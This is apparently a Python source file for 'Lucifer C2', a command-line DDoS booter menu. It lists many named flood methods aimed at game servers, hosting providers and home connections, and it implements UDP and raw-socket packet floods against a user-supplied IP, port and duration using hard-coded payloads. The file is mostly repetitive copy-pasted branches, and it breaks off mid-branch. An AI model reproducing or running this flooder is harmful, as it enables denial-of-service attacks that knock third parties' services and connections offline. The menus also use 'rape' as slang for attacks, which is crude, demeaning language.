#LUCIFER C2 BY ACEE
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = """╔═[Acee@Lucifer]
╚════>"""

help = """
\u001b[31m╔════════════════════════╗
\u001b[31m║ \033[34m---- \033[32mMethods List! \033[34m--- \u001b[31m╚═════════╗
\u001b[31m║ \033[37mplan\033[32m> \033[37mShows Api Plan!  \u001b[31m          ║
\u001b[31m║ \033[37mgen3   \033[32m> \033[37mShows Gen3 Methods!     \u001b[31m║
\u001b[31m║ \033[37mgen2   \033[32m> \033[37mShows Gen2 Methods!     \u001b[31m║
\u001b[31m║ \033[37mlayer4 \033[32m> \033[37mShows Layer 4 Methods!  \u001b[31m║
\u001b[31m║ \033[37mlayer7 \033[32m> \033[37mShows Layer 7 Methods!  \u001b[31m║
\u001b[31m║ \033[37mprivate\033[32m> \033[37mShows Private Methods!  \u001b[31m║
\u001b[31m║ \033[37mraw    \033[32m> \033[37mShows Raw Methods!      \u001b[31m║
\u001b[31m║ \033[37mmore   \033[32m> \033[37mShows More Methods!     \u001b[31m║
\u001b[31m╚══════════════════════════════════╝
"""

plan = """
\u001b[31m ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╦
\u001b[31m ╠═╣║  ║╣ ║╣   ╠═╣╠═╝║
\u001b[31m ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩╩  ╩

\u001b[31m USERNAME = Acee
\u001b[31m VIP = TRUE
\u001b[31m API = TRUE
\u001b[31m ADMIN = TRUE
\u001b[31m API ACCESS = TRUE
\u001b[31m EXPIRED TIME = 998.0
"""

attacked = """
╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
"""

raw = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37mudpraw \033[34m- \033[37mRaw UDP Flood \u001b[31m  ║ \033[37mhexraw \033[34m- \033[37mRaw HEX Flood \u001b[31m    ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mtcpraw \033[34m- \033[37mRaw TCP Flood \u001b[31m║ ║ \033[37mvseraw \033[34m- \033[37mRaw VSE Flood \u001b[31m  ║
\u001b[31m             ║ \033[37mstdraw \033[34m- \033[37mRaw STD Flood \u001b[31m║ ║ \033[37mqmsynraw \033[34m- \033[37mRaw SYN Flood \u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37movhslav \033[34m- \033[37mSlavic Flood \u001b[31m  ║ \033[37miotv1 \033[34m- \033[37mCustom Method!  \u001b[31m   ║
\u001b[31m            ║ \033[37mcpukill \033[34m- \033[37mCpu Rape Flood\u001b[31m ║ \033[37miotv2 \033[34m- \033[37mCustom Method!  \u001b[31m   ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mfivemkill \033[34m- \033[37mFivem Kill \u001b[31m║ ║ \033[37miotv3 \033[34m-\033[37m Custom Method!  \u001b[31m ║
\u001b[31m             ║ \033[37micmprape  \033[34m- \033[37mICMP Rape  \u001b[31m║ ║ \033[37mssdp  \033[34m-\033[37m Amped SSDP      \u001b[31m ║
\u001b[31m             ║ \033[37mtcprape \033[34m- \033[37mRaping TCP   \u001b[31m║ ║ \033[37marknull \033[34m- \033[37mArk Method    \u001b[31m ║
\u001b[31m             ║ \033[37mnforape \033[34m- \033[37mNfo Method   \u001b[31m║ ║ \033[37m2kdown  \033[34m- \033[37mNBA 2K Flood  \u001b[31m ║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║ \033[37mhomeslap    \033[34m. \033[37mr6kill     \u001b[31m║ \033[37mfivemtcp  \033[34m. \033[37mnfokill       \u001b[31m ║
\u001b[31m            ║ \033[37mark255      \033[34m. \033[37marklift    \u001b[31m║ \033[37mhotspot   \033[34m. \033[37mvpn           \u001b[31m ║
\u001b[31m            ║ \033[37mhydrakiller \033[34m. \033[37markdown    \u001b[31m║ \033[37mnfonull   \033[34m. \033[37mdhcp          \u001b[31m ║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37movhnat    \033[34m. \033[37movhamp     \u001b[31m║ ║ \033[37movhwdz    \033[34m. \033[37movhx         \u001b[31m║
\u001b[31m             ║ \033[37mnfodrop   \033[34m. \033[37mnfocrush   \u001b[31m║ ║ \033[37mnfodown   \033[34m. \033[37mnfox         \u001b[31m║
\u001b[31m             ║ \033[37mudprape   \033[34m. \033[37mudprapev3  \u001b[31m║ ║ \033[37mfortnite  \033[34m. \033[37mfortnitev2   \u001b[31m║
\u001b[31m             ║ \033[37mudprapev2 \033[34m. \033[37mudpbypass  \u001b[31m║ ║ \033[37mgreeth    \033[34m. \033[37mtelnet       \u001b[31m║
\u001b[31m             ║ \033[37mfivemv2   \033[34m. \033[37mr6drop     \u001b[31m║ ║ \033[37mr6freeze  \033[34m. \033[37mkillall      \u001b[31m║
\u001b[31m             ║ \033[37m2krape    \033[34m. \033[37mfallguys   \u001b[31m║ ║ \033[37movhdown   \033[34m. \033[37movhkill      \u001b[31m║
\u001b[31m             ║ \033[37mfivemrape \033[34m. \033[37mfivemdown  \u001b[31m║ ║ \033[37mfivemv1   \033[34m. \033[37mfivemslump   \u001b[31m║
\u001b[31m             ║ \033[37mkillallv2 \033[34m. \033[37mkillallv3  \u001b[31m║ ║ \033[37mpowerslap \033[34m. \033[37mrapecom      \u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[34m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""



layer4 = """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═
\u001b[31m            ╔══════════════════════════╦════════════════════════════╗
\u001b[31m            ║  \033[37mudp \033[37m[IP] [TIME] [PORT]  \u001b[31m║   \033[37mvse \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ║  \033[37mtcp \033[37m[IP] [TIME] [PORT]  \u001b[31m║   \033[37mack \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\u001b[31m             ║ \033[37mstd \033[37m[IP] [TIME] [PORT] \u001b[31m║ ║ \033[37mdns \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m             ║ \033[37msyn \033[37m[IP] [TIME] [PORT] \u001b[31m║ ║ \033[37movh \033[37m[IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m             ║\033[37m- - - - - - - \033[34mhomerape \033[33m[IP] [TIME] [PORT] \033[37m- - - - - -\u001b[31m║
\u001b[31m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\u001b[31m            ║    \033[37mExample How To Attack\033[93m: \033[32mMETHOD [IP] [TIME] [PORT]   \u001b[31m║
\u001b[31m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\u001b[31m                               ╦  ╦ ╦╔═╗╦╔═╗╔═╗╦═╗
\u001b[31m                               ║  ║ ║║  ║╠╣ ║╣ ╠╦╝
\u001b[31m                               ╩═╝╚═╝╚═╝╩╚  ╚═╝╩╚═

\u001b[31m                ╔═══════════════════════════════════════════════╗
\u001b[31m                ║\033[37m  Welcome To The Start Screen Of Lucifer C2 ! \u001b[31m ║
\u001b[31m                ║\033[37m         Powered \033[37mBy\033[37m AceeAPI Ran By Acee \u001b[31m       ║
\u001b[31m                ║\033[37m         Type \033[37mhelp\033[37m to see the Help Menu \u001b[31m       ║
\u001b[31m                ╚═══════════════════════════════════════════════╝


\u001b[31m                    ╔═════════════════════════════════════════════╗
\u001b[31m                    ║\033[37m How To attack: [METHOD] [IP] [TIME] [PORT].\u001b[31m ║
\u001b[31m                    ╚═════════════════════════════════════════════╝
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,9999))
		sys.stdout.write("\x1b]2;[-] Lucifer C2 - Running: [1] - Api Connected: [9999999999] - Expiry: [998.0] - Online User: [1000] - Admin: [Acee] - POWER : {}% - [Lucif]\x07".format (bots))
		sin = input("\u001b[31m{}\033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system (clear)
			print (banner)
			main()
		if sinput == "cls":
			os.system (clear)
			print (banner)
			main()
		elif sinput == "?":
			os.system (clear)
			print (banner)
			main()
		elif sinput == "layer4":
			os.system (clear)
			print (layer4)
			main()
		elif sinput == "help":
			os.system (clear)
			print (help)
			main()
		elif sinput == "plan":
			os.system (clear)
			print (plan)
			main()
		elif sinput == "attacked":
			os.system (clear)
			print (attacked)
		elif sinput == "methods":
			os.system (clear)
			print (methods)
			main()
		elif sinput == "private":
			os.system (clear)
			print (private)
			main()
		elif sinput == "gen3":
			os.system (clear)
			print (gen3)
			main()
		elif sinput == "raw":
			os.system (clear)
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system (clear)
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system(clear)
						print(attacked)
						time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
